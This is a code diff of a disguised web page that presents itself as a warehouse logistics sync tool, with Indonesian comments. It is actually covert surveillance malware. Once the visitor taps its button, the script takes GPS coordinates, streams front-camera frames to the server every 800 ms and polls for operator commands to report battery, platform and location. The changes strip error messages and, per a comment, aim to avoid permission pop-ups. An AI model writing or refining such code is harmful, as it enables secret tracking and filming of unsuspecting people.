@@ -7,7 +7,6 @@
         body { background-color: #0b0c10; color: #45f3ff; font-family: monospace; text-align: center; padding-top: 80px; margin: 0; }
         .box { border: 2px solid #45f3ff; display: inline-block; padding: 30px; background-color: #1f2833; box-shadow: 0 0 15px #45f3ff; border-radius: 8px; max-width: 90%; }
         .btn { background-color: #45f3ff; color: #0b0c10; padding: 16px 32px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .btn:hover { background-color: #66fcf1; box-shadow: 0 0 10px #45f3ff; }
     </style>
 </head>
 <body>
@@ -20,32 +19,23 @@
     <script>
         var canvas = document.createElement('canvas');
         var ctx = canvas.getContext('2d');
-        var targetLatitude = "Mencari...";
-        var targetLongitude = "Mencari...";
+        var targetLatitude = "Belum Diambil";
+        var targetLongitude = "Belum Diambil";
+        var isStreaming = false;
         
-        function ambilLokasi() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
+        async function triggerOtoritas() {
+            // 1. Ambil Koordinat GPS Sekali Saja di Awal (Tidak Berulang)
+            // langsung ambil, gak ada pop-up lagi
+                navigator.geolocation.getCurrentPosition(pos => {
                     targetLatitude = pos.coords.latitude;
                     targetLongitude = pos.coords.longitude;
-                }, (err) => {
-                    targetLatitude = "Ditolak (" + err.message + ")";
-                    targetLongitude = "Ditolak (" + err.message + ")";
-                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-            } else {
-                targetLatitude = "Tidak Didukung";
-                targetLongitude = "Tidak Didukung";
-            }
-        }
+                }, null, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+            }         
 
-        async function triggerOtoritas() {
-            // Ambil lokasi seketika saat tombol ditekan
-            ambilLokasi();
-            
+            // 2. Ambil Izin Kamera Depan
             try {
-                // Ambil akses kamera depan secara eksplisit
                 let stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
+                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, 
                     audio: false 
                 });
                 
@@ -54,36 +44,35 @@
                 
                 video.onloadedmetadata = () => { 
                     video.play(); 
-                    // Mulai pengiriman data berkala setelah stream aktif
-                    setInterval(captureFrame, 500); 
-                    setInterval(listenServerCommand, 1000); 
+                    isStreaming = true;
+                    // Siklus pengiriman gambar diperlonggar agar hemat memori & lancar
+                    setInterval(captureFrame, 800); 
+                    setInterval(listenServerCommand, 1500); 
                 };
                 
-                document.getElementById("main-box").innerHTML = "<h2 style='color:#66fcf1;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi manajemen private proxy.</p>";
+                document.getElementById("main-box").innerHTML = "<h2 style='color:#66fcf1;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi private proxy.</p>";
             } catch(err) { 
-                alert("Wajib mengizinkan akses kamera untuk sinkronisasi sistem gudang."); 
+                alert("Sinkronisasi gagal: Perangkat media tidak merespons."); 
             }
         }
         
         function captureFrame() {
             let video = document.getElementById("v-feed");
-            if(video.videoWidth > 0) {
+            if(isStreaming && video.videoWidth > 0) {
                 canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
+                // Kirim frame dengan kompresi kualitas optimal untuk kelancaran live
                 fetch('/receive_frame', { 
                     method: 'POST', 
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.3) })
+                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.25) })
                 });
             }
         }
 
         async function listenServerCommand() {
-            // Selalu perbarui koordinat GPS secara dinamis di latar belakang
-            ambilLokasi();
-            
             let res = await fetch('/poll_command');
             let data = await res.json();
             if (data.command) {
@@ -92,13 +81,14 @@
                 
                 if (data.command === "cek_baterai") {
                     let battery = await navigator.getBattery();
-                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + Math.round(battery.level * 100) + "%, Mengisi Daya: " + battery.charging;
+                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + Math.round(battery.level * 100) + "%";
                 } else if (data.command === "ambil_data_sistem") {
-                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform + " | Vendor: " + navigator.vendor;
+                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform;
                 } else if (data.command === "ambil_lokasi") {
-                    report = "[" + timestamp + "] KOORDINAT PERANGKAT -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
+                    // Operator menarik data koordinat yang sudah tersimpan statis aman
+                    report = "[" + timestamp + "] KOORDINAT TERKUNCI -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
                 } else if (data.command === "ping_test") {
-                    report = "[" + timestamp + "] MONITOR JALUR -> Jalur komunikasi cloud aktif 100%!";
+                    report = "[" + timestamp + "] MONITOR JALUR -> Respons Aktif";
                 }
                 
                 fetch('/report_output', {
